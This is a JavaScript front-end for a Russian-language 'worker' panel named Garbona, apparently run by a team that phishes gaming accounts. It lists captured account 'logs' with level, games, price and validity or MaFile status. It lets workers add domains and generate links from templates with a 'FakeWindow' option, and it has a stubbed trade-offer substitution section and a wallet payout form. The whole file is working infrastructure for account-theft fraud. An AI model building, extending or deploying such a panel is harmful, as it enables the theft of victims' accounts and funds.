(async function () {
  const user = await WorkerAuth.requireAuth();
  if (!user) return;

  let supportUrl = "https://t.me/garbona";
  try {
    const cfg = await WorkerAuth.getConfig();
    if (cfg.supportUrl) supportUrl = cfg.supportUrl;
  } catch (_) {}

  const TITLES = {
    logs: "Логи",
    trade: "Подмена",
    sites: "Сайты",
    tasks: "Задачи",
    team: "Команда",
    settings: "Настройки",
    support: "Поддержка",
    terms: "Соглашение",
  };

  const PRIMARY_MOBILE = new Set(["logs", "sites", "tasks"]);
  const main = document.getElementById("main");
  const sidebar = document.getElementById("sidebar");
  const backdrop = document.getElementById("sidebarBackdrop");
  const mobileNav = document.getElementById("mobileNav");
  const toastHost = document.getElementById("toastHost");

  document.getElementById("userName").textContent =
    user.firstName || user.username || user.telegramId;
  document.getElementById("userRole").textContent = user.isAdmin ? "admin" : "worker";
  document.getElementById("userBalance").textContent = user.walletDisplay || `$${Number(user.walletUsd || 0).toFixed(2)}`;

  function setSidebarOpen(open) {
    sidebar.classList.toggle("is-open", open);
    backdrop.classList.toggle("is-visible", open);
    document.body.classList.toggle("menu-open", open);
  }

  function syncMobileNav(viewId) {
    if (!mobileNav) return;
    const moreActive = !PRIMARY_MOBILE.has(viewId);
    mobileNav.querySelectorAll(".mobile-nav-item").forEach((el) => {
      if (el.dataset.menu === "more") el.classList.toggle("is-active", moreActive);
      else el.classList.toggle("is-active", el.dataset.view === viewId);
    });
  }

  function toast(msg, type) {
    const el = document.createElement("div");
    el.className = `toast ${type === "error" ? "error" : "ok"}`;
    el.textContent = msg;
    toastHost.appendChild(el);
    setTimeout(() => el.remove(), 3200);
  }

  function escapeHtml(s) {
    return String(s ?? "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function formatDate(value) {
    if (!value) return "—";
    const d = new Date(value);
    if (Number.isNaN(d.getTime())) return String(value);
    return d.toLocaleString("ru-RU");
  }

  document.getElementById("menuToggle").addEventListener("click", () => setSidebarOpen(true));
  document.getElementById("sidebarClose").addEventListener("click", () => setSidebarOpen(false));
  backdrop.addEventListener("click", () => setSidebarOpen(false));
  document.getElementById("logoutBtn").addEventListener("click", async () => {
    await WorkerAuth.logout();
    location.replace("login.html");
  });

  document.getElementById("nav").addEventListener("click", (e) => {
    const btn = e.target.closest("[data-view]");
    if (btn) showView(btn.dataset.view);
  });

  mobileNav?.addEventListener("click", (e) => {
    const btn = e.target.closest(".mobile-nav-item");
    if (!btn) return;
    if (btn.dataset.menu === "more") {
      setSidebarOpen(true);
      return;
    }
    if (btn.dataset.view) showView(btn.dataset.view);
  });

  async function showView(id) {
    const viewId = TITLES[id] ? id : "logs";
    document.querySelectorAll(".nav-item").forEach((el) => {
      el.classList.toggle("is-active", el.dataset.view === viewId);
    });
    syncMobileNav(viewId);
    setSidebarOpen(false);
    history.replaceState(null, "", `#${viewId}`);
    main.innerHTML = `<div class="page-head"><h1>Загрузка…</h1></div>`;
    try {
      if (viewId === "logs") await renderLogs();
      else if (viewId === "trade") await renderTrade();
      else if (viewId === "sites") await renderSites();
      else if (viewId === "tasks") await renderTasks();
      else if (viewId === "team") await renderTeam();
      else if (viewId === "settings") await renderSettings();
      else if (viewId === "support") await renderSupport();
      else if (viewId === "terms") await renderTerms();
    } catch (e) {
      main.innerHTML = `<div class="card"><div class="card-body"><div class="empty"><div class="empty-title">Ошибка</div><div>${escapeHtml(e.message)}</div></div></div></div>`;
    }
  }

  async function renderLogs() {
    const q = "";
    const data = await WorkerAPI.get(`/logs?limit=40${q ? `&q=${encodeURIComponent(q)}` : ""}`);
    const s = data.summary || {};
    main.innerHTML = `
      <div class="page-head">
        <h1>Сводка</h1>
        <p>${s.totalLogs || 0} логов за все время · аккаунт панели: ${escapeHtml(data.panelUsername || "—")}</p>
      </div>
      <div class="kpi-row">
        <div class="kpi-card">
          <div class="kpi-label">Логов всего</div>
          <div class="kpi-value">${s.totalLogs || 0}</div>
          <div class="kpi-hint">за всё время</div>
        </div>
        <div class="kpi-card blue">
          <div class="kpi-label">Логов сегодня</div>
          <div class="kpi-value">${s.todayLogs || 0}</div>
          <div class="kpi-hint">за сегодня</div>
        </div>
        <div class="kpi-card muted">
          <div class="kpi-label">Переходы</div>
          <div class="kpi-value">${s.todayVisits || 0}</div>
          <div class="kpi-hint">на сайты за сегодня</div>
        </div>
      </div>
      <div class="card">
        <div class="card-head">
          <h2 class="card-title">Список логов ${data.logs?.length || 0}</h2>
        </div>
        <div class="card-body">
          <div class="toolbar">
            <input class="search-input" id="logsSearch" placeholder="Поиск в таблице" />
            <button type="button" class="btn btn-ghost" id="logsRefresh">Обновить</button>
          </div>
          <div class="table-wrap">
            <table class="data">
              <thead>
                <tr>
                  <th>ID</th><th>Дата</th><th>Аккаунт</th><th>Игры</th><th>Цена</th><th>Данные</th><th>Статус</th>
                </tr>
              </thead>
              <tbody id="logsBody"></tbody>
            </table>
          </div>
        </div>
      </div>
    `;

    function fill(rows) {
      const body = document.getElementById("logsBody");
      body.innerHTML = "";
      (rows || []).forEach((row) => {
        const badge =
          row.status === "Валид" ? "ok" : row.status === "MaFile" ? "warn" : "bad";
        const tr = document.createElement("tr");
        tr.innerHTML = `
          <td>${escapeHtml(row.id)}</td>
          <td class="muted">${escapeHtml(formatDate(row.createdAt))}</td>
          <td>${escapeHtml(row.country || "")} ${row.level != null ? `${row.level} LVL` : ""}</td>
          <td class="muted">${row.gamesCount || 0}</td>
          <td>$${Number(row.priceUsd || 0).toFixed(2)}</td>
          <td>${escapeHtml(row.username || "—")}</td>
          <td><span class="badge ${badge}">${escapeHtml(row.status)}</span></td>
        `;
        body.appendChild(tr);
      });
      if (!(rows || []).length) {
        body.innerHTML = `<tr><td colspan="7" class="muted">Логов пока нет</td></tr>`;
      }
    }

    fill(data.logs);
    document.getElementById("logsRefresh").addEventListener("click", () => showView("logs"));
    document.getElementById("logsSearch").addEventListener("input", (e) => {
      const term = e.target.value.trim().toLowerCase();
      const filtered = (data.logs || []).filter((row) =>
        [row.id, row.username, row.status].join(" ").toLowerCase().includes(term)
      );
      fill(filtered);
    });
  }

  async function renderTrade() {
    main.innerHTML = `
      <div class="page-head">
        <h1>Подмена</h1>
        <p>Раздел трейд-сессий и офферов.</p>
      </div>
      <div class="subnav">
        <button type="button" class="subnav-btn is-active" data-tab="sessions">Список сессий</button>
        <button type="button" class="subnav-btn" data-tab="offers">Трейд офферы</button>
      </div>
      <div class="card"><div class="card-body">
        <div class="stub-box" id="tradeStub">
          <strong>Режим накопления сессий</strong><br/>
          Сейчас подмена офферов недоступна в нашей панели. Раздел зарезервирован под будущий API.
        </div>
      </div></div>
    `;
    const stub = document.getElementById("tradeStub");
    main.querySelector(".subnav").addEventListener("click", (e) => {
      const btn = e.target.closest("[data-tab]");
      if (!btn) return;
      main.querySelectorAll(".subnav-btn").forEach((el) => el.classList.toggle("is-active", el === btn));
      if (btn.dataset.tab === "offers") {
        stub.innerHTML = `<strong>Трейд офферы</strong><br/>Список офферов появится после подключения trade API.`;
      } else {
        stub.innerHTML = `<strong>Режим накопления сессий</strong><br/>Сейчас подмена офферов недоступна в нашей панели. Раздел зарезервирован под будущий API.`;
      }
    });
  }

  async function renderSites() {
    let selectedId = null;

    async function loadList() {
      const data = await WorkerAPI.get("/sites/domains");
      main.innerHTML = `
        <div class="page-head">
          <h1>Мои сайты</h1>
          <p>Домены аккаунта <code>${escapeHtml(data.panelUsername || "—")}</code>. Свои: ${data.ownCount || 0} · онлайн: ${data.totalOnline || 0}</p>
        </div>
        <div class="card"><div class="card-body">
          <div class="toolbar">
            <input class="search-input" id="domainInput" placeholder="новый-домен.com" />
            <button type="button" class="btn btn-ghost" id="domainCheck">Проверить</button>
            <button type="button" class="btn btn-primary" id="domainAdd">Добавить домен</button>
          </div>
          <div class="muted" id="domainHint" style="margin-bottom:12px"></div>
          <div class="table-wrap">
            <table class="data">
              <thead><tr><th>Домен</th><th>Онлайн</th><th>Тип</th><th>ID</th></tr></thead>
              <tbody id="domainsBody"></tbody>
            </table>
          </div>
        </div></div>
      `;
      const body = document.getElementById("domainsBody");
      (data.domains || []).forEach((d) => {
        const tr = document.createElement("tr");
        tr.className = "clickable";
        tr.innerHTML = `
          <td>${escapeHtml(d.domain)}</td>
          <td>${d.online}</td>
          <td class="muted">${d.isOwn ? "свой" : d.isTeamPublic ? "командный" : "—"}</td>
          <td class="muted">${d.id}</td>
        `;
        tr.addEventListener("click", () => {
          selectedId = d.id;
          loadDetail();
        });
        body.appendChild(tr);
      });
      if (!(data.domains || []).length) {
        body.innerHTML = `<tr><td colspan="4" class="muted">Доменов пока нет</td></tr>`;
      }
      const hint = document.getElementById("domainHint");
      document.getElementById("domainCheck").addEventListener("click", async () => {
        try {
          const preview = await WorkerAPI.post("/sites/domains/check", {
            domain: document.getElementById("domainInput").value.trim(),
          });
          hint.textContent = `Свободен. A-запись → ${preview.ip || "—"}`;
          toast("Домен свободен");
        } catch (e) {
          hint.textContent = e.message;
          toast(e.message, "error");
        }
      });
      document.getElementById("domainAdd").addEventListener("click", async () => {
        try {
          const result = await WorkerAPI.post("/sites/domains", {
            domain: document.getElementById("domainInput").value.trim(),
          });
          toast(`Добавлен ${result.created?.domain || ""}`);
          selectedId = result.created?.id || null;
          if (selectedId) await loadDetail();
          else await loadList();
        } catch (e) {
          toast(e.message, "error");
        }
      });
    }

    async function loadDetail() {
      const [detail, templatesData] = await Promise.all([
        WorkerAPI.get(`/sites/domains/${selectedId}`),
        WorkerAPI.get("/sites/templates").catch(() => ({ templates: [] })),
      ]);
      const d = detail.domain;
      const templates = templatesData.templates || [];
      main.innerHTML = `
        <div class="page-head">
          <h1>${escapeHtml(d.domain)}</h1>
          <p>ID ${d.id} · ${d.isOwn ? "свой" : "командный"} · онлайн ${d.online}</p>
        </div>
        <div class="card">
          <div class="card-head">
            <h2 class="card-title">Ссылки</h2>
            <button type="button" class="btn btn-ghost" id="sitesBack">← К списку</button>
          </div>
          <div class="card-body">
            <div class="toolbar">
              <input class="search-input" id="linkPath" placeholder="path (пусто = random)" />
              <select class="select-input" id="linkTemplate">
                <option value="">${templates.length ? "Шаблон…" : "Нет доступных шаблонов"}</option>
                ${templates
                  .map(
                    (t) =>
                      `<option value="${t.id}">${escapeHtml(t.name || `Template #${t.id}`)} (#${t.id})</option>`
                  )
                  .join("")}
              </select>
              <select class="select-input" id="linkWindow">
                <option value="FakeWindow">FakeWindow</option>
                <option value="CurrentWindow">CurrentWindow</option>
                <option value="NewWindow">NewWindow</option>
                <option value="AboutBlank">AboutBlank</option>
              </select>
              <button type="button" class="btn btn-blue" id="linkCreate">Создать ссылку</button>
            </div>
            <div class="table-wrap">
              <table class="data">
                <thead><tr><th>Path</th><th>Окно</th><th>Шаблон</th><th>ID</th></tr></thead>
                <tbody id="linksBody"></tbody>
              </table>
            </div>
            ${
              d.isOwn
                ? `<div style="margin-top:16px"><button type="button" class="btn btn-danger" id="domainDelete">Удалить домен</button></div>`
                : ""
            }
          </div>
        </div>
      `;
      const linksBody = document.getElementById("linksBody");
      (detail.links || []).forEach((link) => {
        const tr = document.createElement("tr");
        tr.innerHTML = `
          <td>/${escapeHtml(link.path || "")}</td>
          <td class="muted">${escapeHtml(link.windowType || "—")}</td>
          <td class="muted">${escapeHtml(link.templateName || link.template || "—")}</td>
          <td class="muted">${link.id ?? "—"}</td>
        `;
        linksBody.appendChild(tr);
      });
      if (!(detail.links || []).length) {
        linksBody.innerHTML = `<tr><td colspan="4" class="muted">Ссылок нет</td></tr>`;
      }
      document.getElementById("sitesBack").addEventListener("click", () => {
        selectedId = null;
        loadList();
      });
      document.getElementById("linkCreate").addEventListener("click", async () => {
        try {
          await WorkerAPI.post(`/sites/domains/${selectedId}/links`, {
            path: document.getElementById("linkPath").value.trim(),
            templateId: document.getElementById("linkTemplate").value,
            windowType: document.getElementById("linkWindow").value,
          });
          toast("Ссылка создана");
          await loadDetail();
        } catch (e) {
          toast(e.message, "error");
        }
      });
      document.getElementById("domainDelete")?.addEventListener("click", async () => {
        if (!confirm(`Удалить ${d.domain}?`)) return;
        try {
          await WorkerAPI.del(`/sites/domains/${selectedId}`);
          toast("Домен удалён");
          selectedId = null;
          await loadList();
        } catch (e) {
          toast(e.message, "error");
        }
      });
    }

    await loadList();
  }

  async function renderTasks() {
    const data = await WorkerAPI.get("/tasks");
    main.innerHTML = `
      <div class="page-head">
        <h1>Задачи</h1>
        <p>${escapeHtml(data.message || "Список задач аккаунта панели.")}</p>
      </div>
      <div class="card">
        <div class="card-head"><h2 class="card-title">Список задач</h2></div>
        <div class="card-body">
          <div class="table-wrap">
            <table class="data">
              <thead><tr><th>Задача</th><th>Статус</th><th>Аккаунты</th><th>Дата</th></tr></thead>
              <tbody id="tasksBody"></tbody>
            </table>
          </div>
        </div>
      </div>
    `;
    const body = document.getElementById("tasksBody");
    (data.tasks || []).forEach((t) => {
      const tr = document.createElement("tr");
      tr.innerHTML = `
        <td>${escapeHtml(t.name)}</td>
        <td class="muted">${escapeHtml(t.status)}</td>
        <td>${t.accounts || 0}</td>
        <td class="muted">${escapeHtml(formatDate(t.createdAt))}</td>
      `;
      body.appendChild(tr);
    });
    if (!(data.tasks || []).length) {
      body.innerHTML = `<tr><td colspan="4" class="muted">Пока пусто</td></tr>`;
    }
  }

  async function renderTeam() {
    const data = await WorkerAPI.get("/team/workers");
    main.innerHTML = `
      <div class="page-head">
        <h1>Команда</h1>
        <p>Каждый воркер авторизуется под своими данными. Общие домены команды и свои логи доступны в соответствующих разделах.</p>
      </div>
      <div class="card"><div class="card-body">
        <div class="table-wrap">
          <table class="data">
            <thead><tr><th>Логин</th><th>Telegram</th><th>ID</th></tr></thead>
            <tbody id="teamBody"></tbody>
          </table>
        </div>
      </div></div>
    `;
    const body = document.getElementById("teamBody");
    (data.workers || []).forEach((w) => {
      const tr = document.createElement("tr");
      tr.innerHTML = `
        <td>${escapeHtml(w.username || "—")}${w.isOwner ? ' <span class="badge ok">вы</span>' : ""}</td>
        <td class="muted">${escapeHtml(w.telegram || "—")}</td>
        <td class="muted">${w.id ?? "—"}</td>
      `;
      body.appendChild(tr);
    });
    if (!(data.workers || []).length) {
      body.innerHTML = `<tr><td colspan="3" class="muted">Пусто</td></tr>`;
    }
  }

  async function renderSettings() {
    const data = await WorkerAPI.get("/settings");
    const u = data.user || user;
    const methods = data.methods || [];
    main.innerHTML = `
      <div class="page-head">
        <h1>Настройки</h1>
        <p>Реквизиты выплат и профиль. Оповещения приходят в Telegram-бота.</p>
      </div>
      <div class="card"><div class="card-body">
        <div class="form-grid">
          <div>
            <label class="form-label">Способ выплат</label>
            <select class="select-input" id="payoutMethod" style="width:100%">
              <option value="">Не выбран</option>
              ${methods
                .map(
                  (m) =>
                    `<option value="${m.id}" ${u.payoutMethod === m.id ? "selected" : ""}>${escapeHtml(m.label)} (fee $${m.feeUsd})</option>`
                )
                .join("")}
            </select>
          </div>
          <div>
            <label class="form-label">Реквизиты</label>
            <input class="text-input" id="payoutAddress" style="width:100%" value="${escapeHtml(u.payoutAddress || "")}" placeholder="Адрес кошелька / ссылка" />
          </div>
          <div>
            <label class="form-label">Баланс</label>
            <div class="kpi-value" style="font-size:22px">${escapeHtml(u.walletDisplay || `$${Number(u.walletUsd || 0).toFixed(2)}`)}</div>
          </div>
          <div>
            <label class="form-label">Сумма вывода (мин. $${data.minWithdrawalUsd || 10})</label>
            <input class="text-input" id="withdrawAmount" style="width:100%" type="number" min="1" step="0.01" placeholder="10.00" />
          </div>
          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button type="button" class="btn btn-primary" id="saveSettings">Сохранить</button>
            <button type="button" class="btn btn-blue" id="withdrawBtn">Запросить вывод</button>
          </div>
        </div>
      </div></div>
    `;
    document.getElementById("saveSettings").addEventListener("click", async () => {
      try {
        const res = await WorkerAPI.patch("/settings", {
          payoutMethod: document.getElementById("payoutMethod").value,
          payoutAddress: document.getElementById("payoutAddress").value.trim(),
        });
        document.getElementById("userBalance").textContent =
          res.user?.walletDisplay || document.getElementById("userBalance").textContent;
        toast("Сохранено");
      } catch (e) {
        toast(e.message, "error");
      }
    });
    document.getElementById("withdrawBtn").addEventListener("click", async () => {
      try {
        await WorkerAPI.post("/wallet/withdraw", {
          amount: Number(document.getElementById("withdrawAmount").value),
          method: document.getElementById("payoutMethod").value,
          address: document.getElementById("payoutAddress").value.trim(),
        });
        toast("Заявка на вывод создана");
        const me = await WorkerAuth.me();
        document.getElementById("userBalance").textContent =
          me.user?.walletDisplay || document.getElementById("userBalance").textContent;
      } catch (e) {
        toast(e.message, "error");
      }
    });
  }

  async function renderSupport() {
    main.innerHTML = `
      <div class="page-head">
        <h1>Поддержка</h1>
        <p>Связь с командой по вопросам панели и выплат.</p>
      </div>
      <div class="card"><div class="card-body">
        <a class="btn btn-blue" href="${escapeHtml(supportUrl)}" target="_blank" rel="noopener">Открыть поддержку</a>
      </div></div>
    `;
  }

  async function renderTerms() {
    main.innerHTML = `
      <div class="page-head">
        <h1>Соглашение</h1>
        <p>Правила использования панели Garbona.</p>
      </div>
      <div class="card"><div class="card-body" style="line-height:1.55;color:var(--muted)">
        <p>Используя панель, вы подтверждаете, что являетесь участником команды и несёте ответственность за действия со своим аккаунтом сайтов.</p>
        <p>Запрещены передача доступов третьим лицам, обход модерации и фрод. Нарушения могут привести к бану и обнулению баланса.</p>
        <p>Администрация вправе изменять условия без предварительного уведомления. Актуальная версия всегда доступна в этом разделе.</p>
      </div></div>
    `;
  }

  const hash = location.hash.replace(/^#/, "");
  await showView(hash || "logs");
})();
